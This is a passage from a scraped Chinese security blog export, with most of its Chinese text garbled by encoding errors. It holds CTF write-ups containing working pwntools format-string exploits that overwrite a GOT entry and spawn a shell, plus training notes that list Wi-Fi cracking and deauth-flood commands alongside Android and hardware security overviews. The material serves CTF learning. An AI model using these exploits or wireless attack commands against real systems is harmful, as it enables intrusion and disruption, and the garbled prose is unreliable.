read_offset# libc.address = read - read_offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget_offsetsuccess('one_gadget = ' + hex(one_gadget))info('&gt;&gt;&gt; FMTSTR ATTACK &lt;&lt;&lt;')info('FIRST WORD')info(hex(one_gadget &amp; 0xFFFF))exit_got = elf.got['exit']p.recvuntil('input your name: ')p.sendline(p64(exit_got))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str(one_gadget &amp; 0xFFFF))#å–æœ€ä½çš„åŒå­—èŠ‚å¹¶å¯¹é½payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('SECOND WORD')info(hex((one_gadget &gt;&gt; 16) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 2))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 16) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('THIRD WORD')info(hex((one_gadget &gt;&gt; 32) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 4))p.recvuntil('leave a msg: ')payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 32) &amp; 0xFFFF))payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)info('FOURTH WORD')info(hex((one_gadget &gt;&gt; 48) &amp; 0xFFFF))p.recvuntil('input your name: ')p.sendline(p64(exit_got + 6))p.recvuntil('leave a msg: ')if (one_gadget &gt;&gt; 48) &amp; 0xFFFF != 0: payload = '%&#123;&#125;c%12$hn'.format(str((one_gadget &gt;&gt; 48) &amp; 0xFFFF))else: payload = '%12$hn'payload = payload.ljust(0x20, '\\x00')print repr(payload)p.send(payload)p.recvuntil('input your name: ')p.sendline('root')p.recvuntil('leave a msg: ')p.sendline('%p')p.recvuntil('\\n')success('&gt;&gt;&gt; PWNED BY ASSASSINQ &lt;&lt;&lt;')p.interactive() messageboardè¿™é¢˜å¤§ä½¬ä»¬éƒ½ç”¨å †åšï¼Œç„¶è€Œæˆ‘ä¸€ç‚¹éƒ½ä¸ä¼šã€‚åæ¥ç¥ä»™pizzaç»™äº†ä¸€ç§format stringçš„è¶…ç®€å•åšæ³•ã€‚ 123456[*] '/home/assassinq/Desktop/messageboard' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled æ‹–è¿›idaé‡Œï¼Œå…¸å‹çš„å †é¢˜çš„å½¢å¼ï¼Œè¿™é‡Œåªçœ‹ç¬¬å››ä¸ªé€‰é¡¹ï¼š 123456789101112131415161718192021222324252627282930313233unsigned __int64 getshell()&#123; int fd; // ST04_4 __int64 v2; // [rsp+8h] [rbp-58h] __int128 v3; // [rsp+28h] [rbp-38h] __int64 *v4; // [rsp+38h] [rbp-28h] char *v5; // [rsp+40h] [rbp-20h] __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"guess a number:\"); v3 = 0uLL; v5 = command; v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317); readline((__int64)nptr, 0x18u); fd = open(\"/dev/random\", 0); read(fd, &amp;v3, 2uLL); read(fd, (char *)&amp;v3 + 8, 2uLL); v2 = atoi(nptr); v4 = &amp;v2; sleep(1u); printf(\"you guess \", (char *)&amp;v3 + 8); printf(nptr); printf(\" the answer is %lld \\n\", (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1)); if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) ) &#123; puts(\"GG!\"); exit(0); &#125; system(command); return __readfsqword(0x28u) ^ v7;&#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œè®©æˆ‘ä»¬çŒœæµ‹ä¸€ä¸ªç³»ç»Ÿäº§ç”Ÿçš„éšæœºæ•°ï¼ŒçŒœå¯¹äº†å°±èƒ½getshellã€‚å†æ¥çœ‹çœ‹pizzaçš„expï¼š 12345678from pwn import *p = process('./messageboard')p.recvuntil('choice &gt;&gt;')p.sendline('4')p.recvuntil('guess a number:')payload = '%2$*11$s%2$*12$s%13$n'p.sendline(payload)p.interactive() å…³äº*ï¼šå®½åº¦ä¸ç²¾åº¦æ ¼å¼åŒ–å‚æ•°å¯ä»¥å¿½ç•¥ï¼Œæˆ–è€…ç›´æ¥æŒ‡å®šï¼Œæˆ–è€…ç”¨æ˜Ÿå·â€*â€œè¡¨ç¤ºå–å¯¹åº”å‡½æ•°å‚æ•°çš„å€¼ã€‚ä¾‹å¦‚printf(&quot;%*d&quot;, 5, 10)è¾“å‡ºâ€10â€œï¼›printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)è¾“å‡ºâ€abcâ€œã€‚ ç”±æ­¤å¯çŸ¥ï¼Œç¬¬åä¸€ä½å’Œç¬¬åäºŒä½å‚æ•°ä¸Šå­˜æ”¾çš„æ˜¯éšæœºæ•°ï¼Œç¬¬åä¸‰ä½åˆ™æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œè¿™é‡Œå°†éšæœºæ•°çš„å€¼å†™å…¥æˆ‘ä»¬çš„è¾“å…¥ï¼Œè¾¾åˆ°getshellçš„ç›®çš„ã€‚ å †çš„åšæ³•ä»¥åå†æ¥å¤ç°ã€‚ æ€»ç»“æ¯”èµ›æ‰“ä¸‹æ¥ï¼Œå‘ç°å®åŠ›æ˜¯é‡è¦çš„ä¸€éƒ¨åˆ†ï¼ŒåŒæ—¶ç»éªŒã€æŠ€å·§ï¼ˆçŒ¥çå‘è‚²ï¼‰ä»¥åŠè¿æ°”éƒ½æ˜¯é‡è¦çš„å› ç´ ã€‚å¸Œæœ›ä¸‹æ¬¡æœ‰æ›´å¤šçš„æœºä¼šå‚ä¸çº¿ä¸‹AWDæ¯”èµ›ã€‚ å‚è€ƒç½‘ç«™https://www.jianshu.com/p/b8e448951125https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"review","slug":"review","permalink":"https://qianfei11.github.io/tags/review/"}]},{"title":"XMan ELSEï¼ˆäºŒï¼‰","slug":"XMan-ELSEï¼ˆäºŒï¼‰","date":"2018-08-17T08:37:16.000Z","updated":"2018-08-17T10:00:27.449Z","comments":true,"path":"2018/08/17/XMan-ELSEï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/17/XMan-ELSEï¼ˆäºŒï¼‰/","excerpt":"äº†è§£æ— çº¿æ”»å‡»ã€‚","text":"äº†è§£æ— çº¿æ”»å‡»ã€‚ å¸¸è§æ— çº¿æ”»å‡»å¨èƒè€æ—§çš„æ”»å‡»WPA/WPA2-PSK 1234567891011iwconfigairodump-ng start wlan0airodump-ng check kill wlan0mon airodump-ngairodump-ng --bssid [mac addr] -c 11 -w xmantest wlan1monairodump-ng [filename] -w [dic file] Fake APæ”»å‡»Wifi-DOSæ”»å‡»Deauth Floodï¼šç”±äºæœªåŠ å¯†çš„ç®¡ç†å¸§ï¼Œå…è®¸æ¥å—ç¬¬ä¸‰æ–¹çš„è§£é™¤å…³è”å¸§ã€‚ 123iwconfig wlan1mon channel 11airoplay -0 10000 -a [mac addr] -c [] wlan1mon æ— çº¿æ”»é˜²çš„è¿›é˜¶ProbeRequest æš´éœ²ä½ç½®ä¿¡æ¯&amp;å®šä½ SSIDé’“é±¼ 1wlan.fc.type_subtype==4 WPA-Radiusä¼ä¸šæ— çº¿æ”»é˜² EAP-TTLS&amp;&amp;PEAPâ€” EAP-MD5 é’ˆå¯¹æ— çº¿è®¾å¤‡çš„æ¼æ´æŒ–æ˜æ”»å‡»802.11å®¢æˆ·ç«¯Fuzzingï¼ˆæ¨¡ç³Šæµ‹è¯•ï¼‰æ˜¯ä¸€ç§è¯†åˆ«è½¯ä»¶è®¾è®¡ç¼ºé™·å’Œå®‰å…¨æ¼æ´çš„æ–¹æ³•ã€‚ é€šè¿‡å‘ç›®æ ‡å‘é€ç•¸å½¢æ•°æ®ï¼Œè¯•å›¾ä½¿ç›®æ ‡å´©æºƒã€‚ 802.11-Fuzzing =&gt; æ„é€ é•¿åº¦&gt;32 &amp;&amp; &lt;= 255byte SSID IEçš„payload wifi positioning SpoofWiFiå®šä½åŸç†ï¼š æ¯ä¸€ä¸ªæ— çº¿APéƒ½æœ‰ä¸€ä¸ªå…¨çƒå”¯ä¸€çš„MACåœ°å€ï¼Œå¹¶ä¸”ä¸€èˆ¬æ¥è¯´æ— çº¿APåœ¨ä¸€æ®µæ—¶é—´å†…æ˜¯ä¸ä¼šç§»åŠ¨çš„ã€‚ è®¾å¤‡åœ¨å¼€å¯Wi-Fiçš„æƒ…å†µä¸‹ï¼Œå³å¯æ‰«æå¹¶æ”¶é›†å‘¨å›´çš„APä¿¡å·ï¼Œæ— è®ºæ˜¯å¦åŠ å¯†ï¼Œæ˜¯å¦å·²è¿æ¥ï¼Œç”šè‡³ä¿¡å·å¼ºåº¦ä¸è¶³ä»¥æ˜¾ç¤ºåœ¨æ— çº¿ä¿¡å·åˆ—è¡¨ä¸­ï¼Œéƒ½å¯ä»¥è·å–åˆ°APå¹¿æ’­å‡ºæ¥çš„MACåœ°å€ã€‚ è®¾å¤‡å°†è¿™äº›èƒ½å¤Ÿæ ‡ç¤ºAPçš„æ•°æ®å‘é€åˆ°ä½ç½®æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æ£€ç´¢å‡ºæ¯ä¸€ä¸ªAPçš„åœ°ç†ä½ç½®ï¼Œå¹¶ç»“åˆæ¯ä¸ªä¿¡å·çš„å¼ºå¼±ç¨‹åº¦ï¼Œè®¡ç®—å‡ºè®¾å¤‡çš„åœ°ç†ä½ç½®å¹¶è¿”å›åˆ°ç”¨æˆ·è®¾å¤‡ã€‚ ä½ç½®æœåŠ¡å•†è¦ä¸æ–­æ›´æ–°ã€è¡¥å……è‡ªå·±çš„æ•°æ®åº“ï¼Œä»¥ä¿è¯æ•°æ®çš„å‡†ç¡®æ€§ï¼Œæ¯•ç«Ÿæ— çº¿APä¸åƒåŸºç«™å¡”é‚£æ ·åŸºæœ¬100%ä¸ä¼šç§»åŠ¨ã€‚ æ— é™æ”»å‡»çš„è¯†åˆ«ä¸é˜²å¾¡ç­–ç•¥Identify DOS AttackDOSæ”»å‡»æœ‰å¾ˆå¤šç§ï¼ŒAuthentiction Floodã€De-Authentcation Floodã€Association Floodã€Beacon Floodç­‰ã€‚ Identify Fake APé»‘å®¢å…ˆå»ºç«‹ä¸€ä¸ªä¸ä½ åŒSSIDçš„çƒ­ç‚¹ï¼Œè¿ç”¨DOS Attackå°†åˆæ³•Clientå¼ºåˆ¶æ–­æ‰APï¼Œå½“Clientå†æ¬¡æ‰§è¡Œå…³è”è¯·æ±‚æ—¶ï¼Œå·²ç»è¢«åŠ«æŒåˆ°Fake APä¸Šï¼Œè¿›è¡ŒåŠ«æŒï¼Œå¯†ç çªƒå–ç­‰è¡Œä¸ºã€‚","categories":[],"tags":[{"name":"is","slug":"is","permalink":"https://qianfei11.github.io/tags/is/"}]},{"title":"XMan Androidï¼ˆä¸‰ï¼‰","slug":"XMan-Androidï¼ˆä¸‰ï¼‰","date":"2018-08-16T08:58:20.000Z","updated":"2018-08-16T12:34:54.090Z","comments":true,"path":"2018/08/16/XMan-Androidï¼ˆä¸‰ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/16/XMan-Androidï¼ˆä¸‰ï¼‰/","excerpt":"æŒ–æ´æŒ–ä¸åŠ¨ã€‚","text":"æŒ–æ´æŒ–ä¸åŠ¨ã€‚ Androidåº•å±‚å®‰å…¨æ¡†æ¶åŠæ”»å‡»ç¼“é‡ŠæŠ€æœ¯ è‡ªä¸»è®¿é—®é™åˆ¶ åŸºäºuid/gid å®¹æ˜“è¢«çªç ´ å¼ºåˆ¶è®¿é—®é™åˆ¶ SELinux æ”»ç ´éå¸¸å›°éš¾ æå¤§é™ä½æ”»å‡»åå±å®³ éªŒè¯å¯åŠ¨æ¨¡å¼ï¼ˆVerified Bootï¼‰ é€šè¿‡ç¡¬ä»¶å¯†é’¥ï¼Œé€æ­¥éªŒè¯æ•´ä¸ªç³»ç»Ÿ ä¸€æ—¦å‡ºå‚ä¹‹åï¼Œä¸å¯ä¿®æ”¹ ä¿®æ”¹ä¹‹åç³»ç»Ÿæ— æ³•å¯åŠ¨ 6.0å¼€å§‹æ”¯æŒï¼Œ7.0åæ›´åŠ ä¸¥æ ¼ ä»£ç ç­¾åå’Œå¹³å°å¯†é’¥ æ— æ³•åˆ·å…¥ä»»ä½•éç­¾åé•œåƒ Systemçº§åˆ«çš„ç­¾åéªŒè¯ Rootç›¸å…³åŸºç¡€çŸ¥è¯† åè¯è§£é‡Š Rootï¼Ÿrwxä¹‹å¤–çš„æƒé™sä½ Bootloader Recovery Baseband Android Rootç±»å‹ æ°¸ä¹…Root ä¸´æ—¶Root å–æ¶ˆRoot Rootæ–¹å¼ ç›´æ¥ä»Recoveryåˆ·å…¥suå’Œdeamon-su ä½¿ç”¨Bootloaderæ›¿æ¢Recoveryåï¼Œåˆ·å…¥su/deamon-su ä½¿ç”¨å†…æ ¸æ¼æ´Exploitè·å–Root å¸¸ç”¨å·¥å…· è°ƒè¯• IDA Pro gdb Android Studio HOOK Xposed Frida Magisk Canaryã€DEPã€ASLR HeapSpray ä¿¡æ¯æ³„æ¼æ¼æ´ ROP åŸå£°ä»£ç åº“åŠå…¶æ”»å‡»é¢ æœ¬åœ°æ–‡ä»¶å¤„ç†åŸå£°åº“ éŸ³é¢‘ã€è§†é¢‘å¤„ç† æ–‡æ¡£ã€å­—ç¬¦ã€å­—ä½“å¤„ç† å¯æ‰§è¡Œç¨‹åºå¤„ç†ï¼ˆAPPå®‰è£…è¿‡ç¨‹ï¼‰ å…¶ä»–æ–‡ä»¶å¤„ç†ï¼ˆå‹ç¼©æ–‡ä»¶ï¼Œè¯ä¹¦æ–‡ä»¶ç­‰ï¼‰ å…·æœ‰è¿œç¨‹æ”»å‡»é¢çš„åŸç”Ÿåº“ï¼ˆBrowerï¼ŒWIFIï¼ŒBASEBANDï¼ŒBTï¼ŒNFCï¼‰ æµè§ˆå™¨æ”»å‡»é¢ï¼ˆDOMï¼ŒJSï¼‰â€”â€”chromium ç½‘ç»œæ•°æ®å¤„ç†ï¼ˆ802.11åŒ…æ ¼å¼å¤„ç†ï¼Œå…¶ä»–ç½‘ç»œæ§åˆ¶æ•°æ®åŒ…ï¼‰â€”â€”wpa_supplicant åŸºå¸¦å¤„ç†ï¼ˆçŸ­ä¿¡ï¼Œç”µè¯ï¼‰â€”â€”radio.img è“ç‰™ï¼ˆè“ç‰™æ•°æ®åŒ…å¤„ç†ï¼‰â€”â€”/system/bt è¿›ç¨‹é—´é€šä¿¡åŠå…¶ä»–ææƒç›¸å…³åº“ï¼ˆBINDERç­‰ï¼‰ System Services adb shell service list å†…æ ¸æ”»å‡»é¢ç³»ç»Ÿè°ƒç”¨ ç³»ç»Ÿè°ƒç”¨æœ‰å¤šå°‘ ARMï¼š256ï¼ˆandroid 8.0ï¼‰263ï¼ˆandroid 7.xï¼‰258ï¼ˆandroid 6.xï¼‰ ARM64ï¼š224ï¼ˆandroid 8.0ï¼‰221ï¼ˆandroid 7.xï¼‰217ï¼ˆandroid 6.xï¼‰ ç³»ç»Ÿè°ƒç”¨å¯ä»¥åšä»€ä¹ˆ ç†è®ºä¸Šçš„æ‰€æœ‰æ“ä½œï¼Œlibcåªæ˜¯ä¸ºäº†æ˜“ç”¨æ€§çš„å°è£… ç†è®ºä¸Šçš„æ‰€æœ‰æƒé™ï¼Œä¸€èˆ¬æ˜¯è®¾å¤‡ä¸Šçš„æœ€é«˜æƒé™ å¦‚ä½•æ”»å‡» é€šè¿‡ç³»ç»Ÿè°ƒç”¨æœ¬èº«è§¦å‘å†…æ ¸é—®é¢˜ é€šè¿‡ç³»ç»Ÿè°ƒç”¨è®©å†…æ ¸å¤„ç†æ•°æ®æ—¶å‘ç”Ÿé—®é¢˜ å¸¸è§æ”»å‡»åœºæ™¯ å‘é€ç½‘ç»œæ•°æ®æ—¶è§¦å‘é—®é¢˜ï¼Œå¯¼è‡´ROOTææƒ è¶Šæƒå†™æ–‡ä»¶ï¼ˆdirtycowï¼‰ é©±åŠ¨ã€å›ºä»¶ é©±åŠ¨å›ºä»¶æœ‰å¤šå°‘ /devä¸­æœ‰228é¡¹ï¼ˆAndroid 6.0 Nexus 5ï¼‰ é©±åŠ¨å›ºä»¶è´Ÿè´£ä»€ä¹ˆ é€‚é…ç‰¹å®šç¡¬ä»¶çš„è½¯ä»¶ é©±åŠ¨ç¨‹åºä¼šåˆ›å»ºä¸€äº›å€Ÿå£ï¼Œå…è®¸ç”¨æˆ·ä»ç”¨æˆ·ç©ºé—´è®¿é—®ï¼Œä»¥ä¾¿æ§åˆ¶ç¡¬ä»¶ å¦‚ä½•æ”»å‡» è®©é©±åŠ¨å›ºä»¶å¤„ç†æ•°æ®æ—¶å‘ç”Ÿé—®é¢˜ è™½ç„¶è¿˜æ˜¯ä½¿ç”¨IOCTLç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯è´Ÿè´£å¤„ç†çš„ä¸æ˜¯åŸç”Ÿå†…æ ¸ å¸¸è§æ”»å‡»åœºæ™¯ ç½‘ç»œé©±åŠ¨å¤„ç†æ•°æ®æ—¶è§¦å‘é—®é¢˜ å£°å¡ç³»ç»Ÿé©±åŠ¨ã€æ˜¾ç¤ºç³»ç»Ÿé©±åŠ¨ å†…æ ¸æ”»å‡»å’Œç¼“é‡Šç›¸å…³æŠ€æœ¯ SELinux KASLR PXNã€PAN kptr_restrict Page permission mitigation RKP DFI Androidå¸¸ç”¨Fuzzæ–¹æ³• AFLï¼šAmerican Fuzzy Lop Syzkallerï¼šç³»ç»Ÿè°ƒç”¨Fuzzer","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"XMan ELSEï¼ˆä¸€ï¼‰","slug":"XMan-ELSEï¼ˆä¸€ï¼‰","date":"2018-08-15T01:23:36.000Z","updated":"2018-08-17T10:00:29.884Z","comments":true,"path":"2018/08/15/XMan-ELSEï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/15/XMan-ELSEï¼ˆä¸€ï¼‰/","excerpt":"å…³äºè½¯ä»¶æ— çº¿ç”µå’Œç¡¬ä»¶å®‰å…¨å…¥é—¨ã€‚","text":"å…³äºè½¯ä»¶æ— çº¿ç”µå’Œç¡¬ä»¶å®‰å…¨å…¥é—¨ã€‚ SDRå…¥é—¨è½¯ä»¶æ— çº¿ç”µï¼ˆSoftware Defined Radioï¼ŒSDRï¼‰æ˜¯ä¸€ç§å®ç°æ— çº¿é€šä¿¡çš„æ–°æ¦‚å¿µå’Œä½“åˆ¶ã€‚å…¶ä¸­å·²åœ¨ç¡¬ä»¶è¢«å…¸å‹åœ°å®ç°çš„ç»„ä»¶ï¼ˆä¾‹å¦‚æ··é¢‘å™¨ï¼Œæ»¤æ³¢å™¨ï¼Œæ”¾å¤§å™¨ï¼Œè°ƒåˆ¶å™¨ / è§£è°ƒå™¨ï¼Œæ£€æµ‹å™¨ç­‰ï¼‰ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è½¯ä»¶æ‰‹æ®µçš„ä¸ªäººè®¡ç®—æœºä¸Šæˆ–ä»£æ›¿å®æ–½åµŒå…¥å¼ç³»ç»Ÿã€‚ä¸€å¼€å§‹åº”ç”¨åœ¨å†›äº‹é¢†åŸŸï¼Œåœ¨21ä¸–çºªåˆï¼Œç”±äºä¼—å¤šå…¬å¸çš„åŠªåŠ›ï¼Œä½¿å¾—å®ƒå·²ä»å†›äº‹é¢†åŸŸè½¬å‘æ°‘ç”¨é¢†åŸŸï¼Œæˆä¸ºç»æµçš„ã€åº”ç”¨å¹¿æ³›çš„ã€å…¨çƒé€šä¿¡çš„ç¬¬ä¸‰ä»£ç§»åŠ¨é€šä¿¡ç³»ç»Ÿçš„æˆ˜ç•¥åŸºç¡€ æ— çº¿ç”µåªèƒ½åœ¨ç‰¹å®šé¢‘ç‡å‘é€ã€‚ TOOLS RTL2832Uï¼ˆç”µè§†æ£’ï¼‰ï¼šé«˜æ€§èƒ½ã€ä½æˆæœ¬ HackRF BladeRF USRP æ¡ˆä¾‹ æ°‘èˆªé€šä¿¡é€šè¯è§£ç  ADS-Bä¿¡å·ä¼ªé€  é€†å‘åˆ†ææ— çº¿é¥æ§ä¿¡å· ä¿¡å·é‡æ”¾ ä¿¡å·ç›‘å¬ã€å¹²æ‰°ã€çˆ†ç ´ GSMçŸ­ä¿¡å—…æ¢ åŸºç«™é€šä¿¡ï¼ˆä¼ªåŸºç«™ï¼‰ æ°”è±¡å«æ˜Ÿé€šä¿¡ Wifiç ´è§£ WepåŠ å¯† Pinç ç ´è§£ Wpa Wifiä¸‡èƒ½é’¥åŒ™ The way to be a hardware hackerç”µè·¯è®¡ç®—æœºåº•å±‚MOSç®¡ NMOS CMOSï¼šåç›¸å™¨ ==&gt; éé—¨ è¾“å…¥ä¸éé—¨ï¼šå¯„å­˜å™¨ è¾“å…¥æˆ–éé—¨ï¼š é€šä¿¡åè®®é€šç”¨å¼‚æ­¥æ”¶å‘å™¨ï¼ˆUARTï¼‰ä¸€å¯¹ä¸€é€šä¿¡ï¼ŒTX/RX æ•°æ®å¸§ç»“æ„ï¼š 1ä¸ªèµ·å§‹ä½ï¼Œå›ºå®šä¸º0 5-8ä¸ªæ•°æ®ä½ 0-1ä¸ªæ ¡éªŒä½ï¼Œå¯ä»¥æ˜¯å¥‡æ ¡éªŒï¼Œä¹Ÿå¯ä»¥æ˜¯å¶æ ¡éªŒ 1/1.5/2ä¸ªåœæ­¢ä½ï¼Œå›ºå®šä¸º1 SPIä¸²è¡Œå¤–è®¾æ¥å£ï¼Œè®¾å¤‡é—´æœ‰ä¸»ä»ä¹‹åˆ†ï¼ˆM/Sï¼šMaster/Slaveï¼‰ ä¸€ä¸ªå•ç‰‡æœºå’Œä¸€ç‰‡FLASHçš„éƒ¨åˆ†é€šä¿¡ SCLKï¼šæ—¶é’Ÿ MOSIï¼š MISOï¼š CSï¼šChip Select å·®åˆ†åè®®ç”¨ä¸¤çº¿é—´çš„ç”µå‹ä»£è¡¨é€»è¾‘ ä¸¤çº¿å…±åŒå—åŠ æ€§å™ªå£°å½±å“ï¼Œç”µå‹å·®ä¸å˜ï¼Œå…ç–«åŠ æ€§å™ªå£° å¦‚USBã€CAN PSï¼šåŠ æ€§å™ªå£° æ— ç³»ç»Ÿç®€å•ç¨‹åºè®¾è®¡12345678910#include &lt;89c51.h&gt;int main(void)&#123; LED_Init(); while(1) &#123; LED_Toggle(); Delay(1000); &#125;&#125; mainæ°¸ä¸return æ²¡æœ‰å¤šè¿›ç¨‹ ç³»ç»Ÿä¸­æ–­æœåŠ¡å‡½æ•°å…¨æ‰‹åŠ¨é‡è½½ æ¨¡å—å…ˆåˆå§‹åŒ–å†ä½¿ç”¨ï¼Œå¸¸ä¸ç¡¬ä»¶ç›¸å…³ ä¾‹ç¨‹å¾€å¾€æ¯”æ–‡æ¡£å¥½ç”¨ è°ƒè¯•å™¨BUG LED_Onæ›¿ä»£console.log unsigned char s[256]ä¼šçˆ†å†…å­˜","categories":[],"tags":[{"name":"is","slug":"is","permalink":"https://qianfei11.github.io/tags/is/"}]},{"title":"XMan Androidï¼ˆäºŒï¼‰","slug":"XMan-Androidï¼ˆäºŒï¼‰","date":"2018-08-13T13:17:34.000Z","updated":"2018-08-13T13:57:07.396Z","comments":true,"path":"2018/08/13/XMan-Androidï¼ˆäºŒï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/13/XMan-Androidï¼ˆäºŒï¼‰/","excerpt":"å…³äºAndroidæ–¹é¢çš„æ¼æ´æŒ–æ˜ã€‚","text":"å…³äºAndroidæ–¹é¢çš„æ¼æ´æŒ–æ˜ã€‚ Androidåº”ç”¨å±‚å®‰å…¨æ¨¡å‹æ–‡ä»¶å­˜å‚¨ å†…éƒ¨å­˜å‚¨ ä¿å­˜åº”ç”¨çš„ç§æœ‰æ–‡ä»¶ï¼Œéšåº”ç”¨å¸è½½è€Œåˆ é™¤ åº”ç”¨çš„ç§æœ‰ç¼“å­˜æ•°æ® å¤–éƒ¨å­˜å‚¨ å…¨å±€èŒƒå›´å†…å¯è¯»å†™ï¼Œéœ€è¦ç”³è¯·EXTERNAL_STORAGEæƒé™ å¤–ç½®å­˜å‚¨ å¯ç§»é™¤Sdcard ç§æœ‰å­˜å‚¨ å…¬å…±å­˜å‚¨ ä½¿ç”¨å†…éƒ¨å­˜å‚¨ å†…éƒ¨å­˜å‚¨å†™æ–‡ä»¶ è¯»æ–‡ä»¶ ç¼“å­˜æ–‡ä»¶ å¤–éƒ¨å­˜å‚¨ è·å–æƒé™ ä½¿ç”¨getExternalStorageState()æ£€æŸ¥å­˜å‚¨ä»‹è´¨æ˜¯å¦å¯ç”¨ è·å–å…¬å…±ç›®å½• ä¿å­˜ç§æœ‰æ–‡ä»¶ åº”ç”¨ç§æœ‰ç›®å½• /data/data/appname/ database cache files lib shared_prefs åº”ç”¨æ²™ç®± åº”ç”¨å®‰è£…é˜¶æ®µï¼Œè‡ªåŠ¨ç»™æ¯ä¸ªåº”ç”¨åˆ†é…UIDã€å…³è”UID åº”ç”¨ä»¥UIDè¿è¡Œ æ¯ä¸ªåº”ç”¨éƒ½æœ‰åªæœ‰å®ƒå¯è¯»å†™çš„ä¸“ç”¨æ•°æ®ç›®å½• rootç”¨æˆ·çš„UIDä¸º0 ç³»ç»ŸæœåŠ¡UIDä»1000å¼€å§‹ï¼Œsystemç”¨æˆ·UIDä¸º1000ï¼Œåº”ç”¨ç¨‹åºUIDä»10000åˆ°19999 åŒç­¾ååº”ç”¨ç¨‹åºå¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªUIDå®‰è£…ã€ä»è€Œå…±äº«æ–‡ä»¶ æƒé™ å®‰è£…æ—¶ç”³è¯·ï¼Œä¹‹åä¸èƒ½æ”¹å˜ï¼Œé™¤éåŠ¨æ€ç”³è¯· åº”ç”¨é€šè¿‡åœ¨AndroidManifest.xmlæ–‡ä»¶å†…æ·»åŠ æ ‡ç­¾æ¥ç”³è¯·æƒé™ æ ‡ç­¾å®šä¹‰æ–°æƒé™ åŒ…ç®¡ç†å™¨é€šè¿‡ç»´æŠ¤/data/system/packages.xmlæ–‡ä»¶æ¥ç®¡ç†åº”ç”¨æƒé™ç­‰ä¿¡æ¯ æƒé™ä¿æŠ¤çº§åˆ« Normal Dangerous Signature SignatureOrSystem Android Appå‰–æ META-INF/ res/ lib/ AndroidManifest.xml classes.dex resources.arsc Androidåº”ç”¨ç»„ä»¶ç­‰ä»‹ç»å››å¤§ç»„ä»¶ Activity Service Content Provider Broadcast Activityè¿”å›æ ˆ åº”ç”¨ä¸€èˆ¬åŒ…å«å¾ˆå¤šActivityï¼Œå®ƒä»¬æŒ‰ç…§å„è‡ªæ‰“å¼€çš„é¡ºåºæ’åˆ—åœ¨è¿”å›æ ˆï¼ˆBack Stackï¼‰ä¸­ï¼Œè¿™äº›Activityç»Ÿç§°ä¸ºTask å½“å‰ä¸€ä¸ªActivityå¯åŠ¨ä¸€ä¸ªæ–°çš„Activityçš„æ—¶å€™ï¼Œæ–°çš„Activityä¼šè¢«åŠ å…¥è¿”å›æ ˆä¸­ï¼Œå¹¶å¤„äºæ ˆé¡¶ å½“ç”¨æˆ·è¿”å›çš„æ—¶å€™ï¼Œå½“å‰å¤„äºæ ˆé¡¶çš„Activityä¼šä»è¿”å›æ ˆä¸­å¼¹å‡ºï¼Œå¹¶è¢«é”€æ¯ï¼ˆonDestroyï¼‰ï¼Œæ¢å¤å‰ä¸€ä¸ªActivityçš„çŠ¶æ€ Activityå¯åŠ¨æ¨¡å¼ Standard singleTop singleTask singleInstance å¸¸ç”¨åˆ†ææ–¹æ³•åŠå·¥å…·æµé‡åˆ†æ åˆ†æHTTP/HTTPSæµé‡ Burp suite Charles Fiddler æ›´å¤šç§æµé‡ Tcpdump Wireshark é™æ€åˆ†æ Apktool Dex2jar Jd-gui Baksmali JEB2 IDA å¸¸è§æ¼æ´ MIMT WebView SQL Web API è¶Šæƒ è·¯å¾„ç©¿è¶Š ç§æœ‰æ•°æ®æ³„æ¼ æœ¬åœ°å¼€æ”¾ç«¯å£ DOS äºŒè¿›åˆ¶æ¼æ´ æŒ–æ˜æ–¹æ³•åŠç›¸å…³å·¥å…·æ–¹æ³• åŠŸèƒ½åœºæ™¯åˆ†æ ç‰¹å¾æ¼æ´æ£€æŸ¥ å·¥å…·+äººå·¥ å·¥å…· QARK Mobile-Security-Framework-MobSF Janus FlowDroid Drozer","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://qianfei11.github.io/tags/android/"}]},{"title":"2018-XManä¸ªäººæ’ä½èµ›-review","slug":"ã€æœªå®Œæˆã€‘2018-XManä¸ªäººæ’ä½èµ›-review","date":"2018-08-11T12:18:08.000Z","updated":"2019-01-26T08:05:28.916Z","comments":true,"path":"2018/08/11/ã€æœªå®Œæˆã€‘2018-XManä¸ªäººæ’ä½èµ›-review/","link":"","permalink":"https://qianfei11.github.io/2018/08/11/ã€æœªå®Œæˆã€‘2018-XManä¸ªäººæ’ä½èµ›-review/","excerpt":"å”‰pwnè¿˜æ˜¯æ²¡æœ‰å…¥é—¨ã€‚","te